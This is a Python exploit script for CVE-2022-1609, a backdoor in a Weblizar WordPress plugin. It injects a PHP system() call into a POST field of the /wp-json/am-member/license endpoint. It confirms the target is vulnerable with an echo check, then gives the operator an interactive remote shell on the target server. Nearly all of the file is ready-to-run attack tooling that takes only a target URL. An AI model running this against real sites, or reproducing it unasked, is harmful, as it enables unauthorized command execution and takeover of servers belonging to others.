import requests
import argparse
from typing import Optional


def add_scheme_if_missing(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url


def exploit(url: str, command: str) -> Optional[str]:
    api_path = "/wp-json/am-member/license"
    full_url = url.rstrip('/') + api_path

    data = {
        "blowfish": "1",
        "blowf": f"system('{command}');"
    }

    try:
        response = requests.post(full_url, data=data)
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

    if response.status_code == 200:
        return response.text
    else:
        return None


def check_vulnerability(url: str) -> bool:
    check_command = "echo vulnerability_check"
    check_output = exploit(url, check_command)

    if check_output and "vulnerability_check" in check_output:
        return True
    else:
        return False


def main():
    parser = argparse.ArgumentParser(description="Exploit for CVE-2022-1609 WordPress Weblizar Backdoor.")
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g. http://localhost:8888)')

    args = parser.parse_args()
    target_url = args.target

    # Automatically add protocol header (e.g. "http://")
    target_url = add_scheme_if_missing(target_url)

    if check_vulnerability(target_url):
        while True:
            command = input("shell> ")
            if command.lower() == "exit":
                break

            result = exploit(target_url, command)
            if result:
                print(result)
    else:
        print("Failed")


if __name__ == "__main__":
    main()
